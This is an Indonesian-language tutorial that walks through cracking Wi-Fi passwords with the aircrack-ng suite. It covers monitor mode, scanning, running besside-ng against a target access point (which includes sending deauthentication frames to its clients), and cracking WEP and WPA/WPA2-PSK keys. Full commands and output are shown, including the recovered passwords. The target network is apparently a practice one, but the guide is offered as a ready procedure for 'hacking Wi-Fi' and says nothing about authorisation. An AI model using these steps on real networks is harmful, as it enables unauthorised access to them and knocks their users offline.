# Hack Wi-Fi Secara Otomatis (Besside-NG)

## Bahan-Bahan
- PC/Laptop
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Koneksi internet

## Instal Tool

```
sudo apt-get update
sudo apt-get install aircrack-ng
```

## Langkah-Langkah

> [!NOTE]
> Besside-NG ngedukung Wi-Fi:
> - WEP
> - WPA/WPA2-PSK

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

#### 2. Scan Wi-Fi

```
sudo airodump-ng [interface]
```

Output:

```
CH 11 ][ Elapsed: 0 s ][ 2026-01-23 16:50                                                                                                                                                                                                 
                                                                                                                                                                                                                                           
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                       
                                                                                                                                                                                                                                           
84:16:F9:FE:64:68  -31   0       20        0    0  11  130   WPA2 CCMP   PSK  LATIHAN                                                                                                                                                     
                                                                                                                                                                                                                                           
BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                                                                                                         
                                                                                                                                                                                                                                           
84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -26    0 - 1e     1        9  
```

Catet:
- `ESSID`: Nama Wi-Fi
- `BSSID`: MAC address AP
- `CH`: Channel AP
- `STATION`: MAC address client
- `PWR`: Kekuatan sinyal AP dalam satuan decibel-milliwatt (`dBm`)

> [!NOTE]
> Pastiin `PWR` AP target kaga di atas `-60` powernya. Kalo di atas, berarti sinyal AP target lemah, jadi buat WEP proses capture paket bakal susah, IV yang didapet bakalan dikit dapetnya, sama buat WPA/WPA2-PSK proses capture 4-way handshake bakal susah, EAPOL frame yang didapet bisa gagal atau gak lengkap.

#### 3. Capture Handshake & IVs

```
sudo besside-ng -b [bssid] -c [chanel] -W -vv [interface]
```

Output kalo Wi-Fi target WEP:

```
[16:13:57] mac 9C:53:22:84:F7:F9
[16:13:57] Let's ride
[16:13:57] Logging to besside.log
[16:13:57] Found AP 72:CC:1E:58:21:0D [Redmi Note 13] chan 11 crypto WPA dbm -90
[16:13:57] Found AP 84:16:F9:FE:64:68 [LATIHAN] chan 11 crypto WEP dbm -26
[16:13:57] Found client for network [LATIHAN] EA:F0:19:3D:F6:4B
[16:13:57] Pwning [LATIHAN] 84:16:F9:FE:64:68 on chan 11
[16:13:57] Sending ping to LATIHAN
[16:13:57] Sending ping to LATIHAN
[16:13:57] Found client for network [Redmi Note 13] BE:80:F4:9E:77:A3
[16:13:57] Got replayable packet for LATIHAN [len 68]
[16:13:57] Ping reply LATIHAN
[16:13:57] Ping reply LATIHAN
[16:13:57] Sending ping to LATIHAN
[16:13:57] Ping reply LATIHAN
[16:13:57] Sending ping to LATIHAN
[16:13:57] Ping reply LATIHAN
[16:13:57] Sending ping to LATIHAN
[16:13:57] Ping reply LATIHAN
[16:13:58] Sending ping to LATIHAN
[16:13:58] Ping reply LATIHAN
[16:13:58] Sending ping to LATIHAN
[16:13:58] Ping reply LATIHAN
[16:13:58] Sending ping to LATIHAN
[16:13:58] Ping reply LATIHAN
[16:13:58] Sending ping to LATIHAN
[16:13:58] Ping reply LATIHAN
[16:13:58] Sending ping to LATIHAN
[16:13:58] Ping reply LATIHAN
[16:13:58] Ping results for LATIHAN 10/10 (0% loss)
[16:13:58] Authenticating...
[16:13:58] Authenticated
[16:13:58] Associating...
[16:13:58] Associated to LATIHAN AID [2]
[16:14:44] Got key for LATIHAN [31:31:31:31:31:31:31:31:31:31:31:31:31] 45741 IVs
[16:14:44] Pwned network LATIHAN in 0:47 mins:sec
[16:14:44] TO-OWN [] OWNED [LATIHAN] UNREACH []
[16:14:44] All neighbors owned

Dying...
[16:14:44] TO-OWN [] OWNED [LATIHAN] UNREACH []
```

Output kalo Wi-Fi target WPA/WPA2-PSK:

```
[16:04:51] mac 9C:53:22:84:F7:F9
[16:04:51] Let's ride
[16:04:51] Logging to besside.log
[16:04:51] Found AP 72:CC:1E:58:21:0D [Redmi Note 13] chan 11 crypto WPA dbm -82
[16:04:51] Found AP 84:16:F9:FE:64:68 [LATIHAN] chan 11 crypto WPA dbm -26
[16:04:51] Pwning [LATIHAN] 84:16:F9:FE:64:68 on chan 11
[16:04:51] Sending ping to LATIHAN
[16:04:51] Sending ping to LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:51] Sending ping to LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:51] Sending ping to LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:51] Sending ping to LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:51] Found client for network [LATIHAN] 4A:F2:3B:A2:12:29
[16:04:51] Sending ping to LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:51] Sending ping to LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:51] Sending ping to LATIHAN
[16:04:51] Ping reply LATIHAN
[16:04:52] Sending ping to LATIHAN
[16:04:52] Ping reply LATIHAN
[16:04:52] Sending ping to LATIHAN
[16:04:52] Ping reply LATIHAN
[16:04:52] Ping results for LATIHAN 10/10 (0% loss)
[16:04:52] Sending deauth to FF:FF:FF:FF:FF:FF
[16:04:52] Sending deauth to 4A:F2:3B:A2:12:29
[16:04:53] Got WPA handshake step 1 (have 1) for LATIHAN
[16:04:53] Got WPA handshake step 2 (have 7) for LATIHAN
[16:04:53] Got necessary WPA handshake info for LATIHAN
[16:04:53] Run aircrack on wpa.cap for WPA key
[16:04:53] Pwned network LATIHAN in 0:02 mins:sec
[16:04:53] TO-OWN [] OWNED [LATIHAN*] UNREACH []
[16:04:53] All neighbors owned

Dying...
[16:04:53] TO-OWN [] OWNED [LATIHAN*] UNREACH []
```

#### 4. Crack Kunci Wi-Fi

#### 1. Crack Kunci WEP

```
aircrack-ng -a 1 -e [essid] -b [bssid] -l [output] [file_capture] 
```

Output:

```
                                                                                                            Aircrack-ng 1.7 


                                                                                              [00:00:00] Tested 78131 keys (got 45741 IVs)

   KB    depth   byte(vote)
    0    0/  1   31(69632) F0(55296) DB(54784) 1F(53504) 2A(53504) 82(53504) 63(52480) F8(52224) BF(51712) CA(51712) 56(51456) 74(51456) 95(51456) C4(51456) 03(51200) 6A(51200) 7A(51200) 18(50944) 36(50944) 
    1    0/  1   31(58624) EA(54528) AA(52992) 75(52480) BB(52224) 19(51968) 31(51968) D7(51968) F5(51712) 63(51456) 21(51200) 61(51200) E3(51200) BA(50944) 0D(50688) 11(50688) 3E(50688) 81(50688) 58(50432) 
    2    0/  1   31(59392) 15(55296) DE(54272) C6(53504) 83(53248) 0E(52992) AF(52736) D9(52480) 6B(51712) EB(51712) 01(51456) 30(51200) D4(51200) FE(51200) 0F(50944) 6C(50944) A3(50944) E1(50944) 50(50688) 
    3    0/  1   31(66304) 23(54784) 38(53760) A3(52736) E7(52736) DD(52480) 3F(51968) F0(51968) 2F(51712) AD(51712) F7(51456) D6(50688) AF(50432) E5(50432) 9E(50176) BA(50176) 15(49920) 42(49920) 86(49920) 
    4    0/  1   31(58880) 4F(55040) AD(55040) 20(54528) F8(54272) 00(52736) E1(52736) 61(52480) BC(52224) DE(52224) 34(51968) EE(51968) 88(51712) F9(51712) 37(51456) 5E(51456) DF(51456) 75(51200) 72(50688) 
    5    0/  1   31(58880) C2(56320) F6(54528) A0(54016) 7C(53504) A1(52224) C3(52224) 18(51712) 4B(51456) 82(51456) FE(51456) 5E(50944) 81(50944) CD(50944) 14(50688) 44(50688) 8C(50688) 2C(50432) 4C(50432) 
    6    0/  1   31(60160) 8F(56832) 5F(54272) DD(54016) 40(53248) 88(53248) 9D(52992) 3C(52736) 0E(52224) 5C(52224) 71(51968) 83(51968) DB(51712) 59(51456) FC(51456) 7E(50944) 22(50688) 3E(50688) B2(50688) 
    7    0/  1   31(61184) 38(56576) 6B(54528) 52(53248) CE(53248) 30(52992) A1(52992) A3(52992) D3(52992) 78(52480) 61(51968) 0B(51712) B9(51712) D7(51712) 69(51456) 2B(51200) 55(51200) FC(50944) 68(50688) 
    8    0/  2   2C(55296) B9(54528) 03(53504) 29(53504) 17(52480) AC(51712) C2(51712) 06(51456) 1D(51456) 98(51456) DC(51456) DE(51456) EE(51456) 1E(51200) 79(51200) 21(50944) 51(50944) 89(50944) 80(50688) 
    9    0/  1   31(66048) A7(55552) EB(55040) 02(54528) 03(52480) 8C(52480) 45(52224) 48(51968) A9(51968) C5(51968) 7E(51456) A3(51456) 92(51200) D8(51200) FC(51200) 36(50688) 54(50688) 59(50688) 6A(50688) 
   10    0/  1   1B(58368) A3(55808) 16(54784) 70(53760) 96(52224) CB(51712) D9(51712) 86(51456) BE(51456) F9(51200) 43(50944) 46(50944) 6C(50944) 5E(50688) 7F(50688) 9A(50688) AF(50688) 12(50432) BA(50432) 
   11    0/  1   BF(56320) F1(54016) C2(53760) C1(52992) B6(52480) 87(52224) 03(51968) 4C(51968) EC(51968) E2(51712) 95(51456) 2E(51200) FE(50944) 18(50688) 20(50688) 80(50688) 8D(50688) 00(50432) 7A(50432) 
   12    0/  1   31(55512) 1D(54292) 8B(53780) B5(53704) DD(53244) 77(52852) 67(52348) 9E(52152) F0(51940) 31(51656) 22(51620) 62(51464) 21(51212) 76(50984) 37(50576) EA(50480) 7A(50276) 00(50264) 1C(49992) 

     KEY FOUND! [ 31:31:31:31:31:31:31:31:31:31:31:31:31 ] (ASCII: 1111111111111 )
        Decrypted correctly: 100%
```

Password Wi-Fi:
- Hex: `31:31:31:31:31:31:31:31:31:31:31:31:31`
- ASCII: `1111111111111`

#### 2. Crack Kunci WPA/WPA2-PSK

```
aircrack-ng -a 2 -e [essid] -b [bssid] -l [output] [file_capture] -w [wordlist]
```

Output:

```
                               Aircrack-ng 1.7 

      [00:00:00] 59/10303727 keys tested (363.54 k/s) 

      Time left: 7 hours, 52 minutes, 22 seconds                 0.00%

                           KEY FOUND! [ 12345678 ]


      Master Key     : 8E F5 3E A1 40 2E CD 88 F6 86 74 BE 43 37 0E 7E 
                       A6 CD 79 C3 CB 7E 35 81 48 4B A1 23 B9 B9 40 87 

      Transient Key  : 21 FD 78 60 47 13 CE CD 27 7E 5E D8 26 F2 09 C2 
                       74 D7 18 0A 0B 1B B7 33 C7 1F 8A FD 46 C8 4B DA 
                       F4 4F 95 76 E0 14 5F 05 90 B8 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : EB 76 16 0D CE 4B 65 CB 4C CA 65 11 A7 F3 82 53 
```

Password Wi-Fi: `12345678`
